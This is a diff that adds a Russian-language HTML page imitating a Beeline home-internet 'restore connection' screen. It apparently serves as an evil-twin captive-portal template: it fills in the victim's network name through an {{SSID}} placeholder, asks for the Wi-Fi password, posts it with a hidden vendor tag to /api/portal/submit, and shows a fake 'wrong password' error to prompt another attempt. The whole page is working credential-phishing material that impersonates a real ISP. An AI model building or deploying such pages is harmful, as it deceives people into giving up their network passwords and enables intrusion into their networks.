@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Beeline — Домашний интернет</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#1a1a1a;font-family:Arial,Helvetica,sans-serif;min-height:100vh}
+.hdr{background:#FFD700;padding:0 20px;height:56px;display:flex;align-items:center;gap:12px}
+.bee-logo{display:flex;align-items:center;gap:10px}
+.bee-hex{width:36px;height:36px;background:#1a1a1a;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:20px}
+.bee-name{font-size:19px;font-weight:900;color:#1a1a1a;letter-spacing:.5px}
+.hero{background:#FFD700;padding:22px 20px 44px}
+.hero h1{font-size:18px;font-weight:900;color:#1a1a1a;margin-bottom:7px}
+.hero p{font-size:13px;color:#333;line-height:1.6}
+.hero .ssid{font-weight:700;color:#1a1a1a}
+.wrap{max-width:420px;margin:-22px auto 0;padding:0 16px 36px;position:relative}
+.card{background:#fff;border-radius:12px;padding:24px;box-shadow:0 6px 24px rgba(0,0,0,.3)}
+.card h3{font-size:14px;color:#222;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:7px}
+.card h3::before{content:'';width:4px;height:18px;background:#FFD700;border-radius:2px;display:inline-block}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:12px;color:#666;margin-bottom:5px;font-weight:600;text-transform:uppercase;letter-spacing:.4px}
+input[type=text],input[type=password]{width:100%;padding:11px 13px;border:1.5px solid #e0e0e0;border-radius:7px;font-size:14px;color:#222;outline:none;-webkit-appearance:none}
+input[type=text]:focus,input[type=password]:focus{border-color:#FFD700;box-shadow:0 0 0 3px rgba(255,215,0,.2)}
+input[readonly]{background:#f8f8f8;color:#888}
+.btn{width:100%;padding:13px;background:#FFD700;color:#1a1a1a;border:none;border-radius:7px;font-size:15px;font-weight:900;cursor:pointer;margin-top:6px;-webkit-appearance:none;position:relative;letter-spacing:.3px}
+.btn:active{background:#e6c400}
+.spin{display:none;position:absolute;right:16px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:2px solid rgba(26,26,26,.2);border-top-color:#1a1a1a;border-radius:50%;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:translateY(-50%) rotate(360deg)}}
+.error{display:none;background:#fff3f3;border:1px solid #ffcdd2;border-radius:6px;padding:10px;font-size:12px;color:#c62828;margin-top:10px}
+.footer{text-align:center;margin-top:14px;font-size:11px;color:#888}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <div class="bee-logo">
+    <div class="bee-hex">&#128029;</div>
+    <div class="bee-name">Beeline</div>
+  </div>
+</div>
+<div class="hero">
+  <h1>Домашний интернет</h1>
+  <p>Восстановление подключения к сети <span class="ssid">{{SSID}}</span>.<br>Введите пароль для продолжения.</p>
+</div>
+<div class="wrap">
+  <div class="card">
+    <h3>Подключение к Wi-Fi</h3>
+    <form method="POST" action="/api/portal/submit" id="frm">
+      <input type="hidden" name="ssid" value="{{SSID}}">
+      <input type="hidden" name="vendor" value="beeline">
+      <div class="field">
+        <label>Сеть</label>
+        <input type="text" value="{{SSID}}" readonly>
+      </div>
+      <div class="field">
+        <label>Пароль</label>
+        <input type="password" name="password" placeholder="Введите пароль Wi-Fi" required autocomplete="off" minlength="8">
+      </div>
+      <button type="submit" class="btn" id="sbtn">
+        Подключиться
+        <div class="spin" id="sp"></div>
+      </button>
+    </form>
+    <div class="error" id="err">Неверный пароль. Попробуйте ещё раз.</div>
+  </div>
+  <div class="footer">ПАО «ВымпелКом» — Beeline Домашний интернет</div>
+</div>
+<script>
+document.getElementById('frm').addEventListener('submit',function(){
+  document.getElementById('sp').style.display='block';
+  document.getElementById('sbtn').disabled=true;
+});
+if(new URLSearchParams(location.search).get('err')){document.getElementById('err').style.display='block';}
+</script>
+</body>
+</html>
